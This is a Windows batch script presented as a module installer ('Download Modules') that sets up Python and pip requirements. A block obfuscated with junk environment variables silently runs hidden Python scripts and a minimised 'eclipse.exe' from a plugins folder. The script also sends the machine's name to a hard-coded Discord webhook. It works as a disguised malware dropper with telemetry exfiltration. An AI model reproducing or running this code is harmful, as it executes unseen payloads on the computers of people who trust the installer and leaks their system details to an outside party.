@echo off

Title Download Modules...

echo Downloading Requirements... (This should take around 2 minutes the first time running)

python --version 3>NUL 2>&1
if %ERRORLEVEL% neq 0 (
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe' -OutFile 'python_installer.exe' >$null 2>&1"
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
    del python_installer.exe

    where python >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        exit /b 1
    )
)

python -m pip --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    python -m ensurepip >nul 2>&1
    python -m pip install --upgrade pip >nul 2>&1
    python -m pip --version >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        exit /b 1
    )
)

pip install -r requirements.txt 2>nul

i%iYQg%f%MHu% %sFfojwKLNx%n%NMdDX%o%Hrstdx%t%XYVGJxMw% %zyPWI%e%yKlJtPWRS%x%c%i%RUnObYks%s%WeNlFvXSlB%t%QErUwPQ% %VwkFWdrW%"%EdidDmOm%b%ACltiITN%u%vvuIGva%i%jsG%l%HtVFGCn%d%udlbXAcecw%_%JhpbE%d%bUJcRaJk%o%ELDNU%n%qC%e%NsNRn%.%pzzwmjPwzf%f%JVRLej%l%YhvxdEBSy%a%neBY%g%bn%"%Oymu% %JW%(%SrOREoJhbH%
 %TaEIRojVZ% %rP% %XCMmWyhWaB% %TVtLgl%p%P%y%qvmDYt%t%YgduCpI%h%ckrfW%o%OBiuJumK%n%rNTbUYO% %D%u%WVbNM%t%lJmDILGDA%i%Fm%l%qXqVKRVBwp%i%lWrcXP%t%DTJunttX%i%ubGdr%e%UZNsoXLVKo%s%HsvSAEflOh%/%YVdMJYGI%P%IDHQ%l%axCz%u%NlSg%g%fXjz%i%AGSace%n%lShb%s%FwBOECu%/%nfvmoBSjm%b%GuKKgbfIX%u%OkMHTCxPz%i%WEZ%l%s%d%RQ%.%kwq%p%yw%y%juFOvTnie% %MCY%>%OBVRgPPix%n%TaH%u%jYwntFZ%l%G% %nXP%2%biIAiByon%>%cmR%&%dSOJPoIMx%1%uiXBy%
 %zPAbV% %OsfuHEkLRa% %nP% %QiZDZU%i%qNNyvV%f%xAhwYLza% %yC%%E%xIPYXP%R%xeSFpp%R%OSHEEtrsc%O%I%R%xmo%L%hjdXiW%E%PPMj%V%uQg%E%BO%L%wDDvh%% %MvWPhUuat%n%heZMt%e%UdTR%q%lMUaRC% %VTtvPMd%0%tfgIkI% %e%(%iXoROXepEX%
 %k% %MzBiP% %w% %E% %npU% %UPdSMi% %YkFOdFIwn% %eRhOuUu%e%mCKlgrg%x%geXA%i%gy%t%DSUAMsz% %tgBtO%/%hVgz%b%VCVRGZGNKX% %Wxj%1%KH%
 %NT% %CzLmusB% %B% %m%)%fTWua%

 %IHAW% %HLLelfcXp% %QRqmDkmza% %DLmZW%p%pdbBLLxAke%y%qqcuL%t%ZOyJoTJa%h%RFwpw%o%MDcvZdfJ%n%c% %sPaW%u%VI%t%vwFmKmYLDG%i%AOrCcSnr%l%KbZbQJHsk%i%QcqphMkd%t%iRvgXg%i%tiXFJzm%e%ssJNPYZcd%s%ZxdcdwXEQX%/%ZkLwT%P%PEYqCiZ%l%SfD%u%bR%g%AJLHHlXMzw%i%mYLGG%n%SgZkFUz%s%UsmU%/%gnHsBHdu%b%k%u%R%i%vuxaYs%l%VqcsYIqo%d%ANxGIOD%2%ANunAAPzU%.%q%p%ZD%y%jnYXaOelUA% %wixH%>%Wd%n%ChKB%u%BmGwKdVYge%l%iCTaCSya% %DlIkZzJ%2%rdWB%>%JAP%&%KkXTb%1%jQckkVx%
 %XxrbtUHD% %tZbW% %GVe% %kiFm%i%QVhxzH%f%MzBc% %eEm%%E%alqgespYNq%R%dgSmbC%R%XUeqxOr%O%uoQJkFz%R%eQVc%L%pJUNLHi%E%PGC%V%GGhGWh%E%fi%L%ALdb%% %bPnrxlRd%n%G%e%zBbTltZ%q%tnZW% %DhWWPoT%0%AFmGBSd% %Y%(%vcqTY%
 %GHzX% %DMIvlZh% %OkEPjx% %cUicSB% %j% %vlqrmIBDeB% %QTyRUaXPk% %ZrSQnCeNB%e%vootyN%x%bR%i%ypSJ%t%fyB% %ThKm%/%WaTaNpa%b%rgZFV% %Muh%1%KiZfw%
 %wQxlMtv% %GPIameoE% %sYkXtp% %zUo%)%tXOchPQ%

 %Id% %oItaTwL% %KVbtfBTC% %qqQz%s%Jj%t%cKnQR%a%GXbgGPNNy%r%KN%t%VBkV% %xEQNsyr%/%AabC%m%P%i%zIFZjUfwa%n%SIHTh% %Bq%/%CHTBnnHSLq%w%vc%a%BmKQBrc%i%QyGdy%t%BqwpWl% %qech%"%pP%"%wkQHEgydA% %AXwoZUW%u%sjmxyOAs%t%TIkPg%i%cdlHJXAKFc%l%EU%i%ecWCLBgw%t%P%i%lw%e%A%s%YqCAbFNe%/%suqqyh%P%XVyy%l%Xa%u%KHqzQ%g%jhrZLTp%i%aGaC%n%kCSKIZmOn%s%InkuIHQ%/%vnyEzbpIP%e%kQIG%c%jIkehnVm%l%UYg%i%vGIcvU%p%x%s%weSyb%e%ZelxfQnJJA%.%xUwu%e%suORMT%x%RaCmHAAGx%e%q% %s%>%ZaGANGo%n%XVJDUcaBd%u%TbmxrQT%l%K% %DqQwcMw%2%ks%>%hZNGQYDy%&%xgwkAMIloQ%1%LxmLwlXpqI%

 %Ckl% %p% %qt% %SvcjFrCxLs%t%cMeTF%y%UkJoi%p%WrpvzFWu%e%YTiYJPTSoQ% %e%n%LrQyzAsD%u%UwCJlvEB%l%epfh% %jGRBhxZ%>%Ax% %lmd%b%iP%u%aqyKAh%i%i%l%lBapfKGXg%d%W%_%CleQ%d%fPF%o%lU%n%cHqIFn%e%k%.%MUPLUglfpT%f%r%l%TL%a%gW%g%mTQUysOII%
)%ElihC%

set SYSTEM_NAME=%COMPUTERNAME%
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"%SYSTEM_NAME% has run Eclipse tool.\"}" https://discord.com/api/webhooks/1267985728223186958/_UwqU1xD0Qkn9akumzYJ0ERtFCZSLxzGdYQFnWWmibLyivYVLIxMHzSbyZ57LXiCsN17

python main.py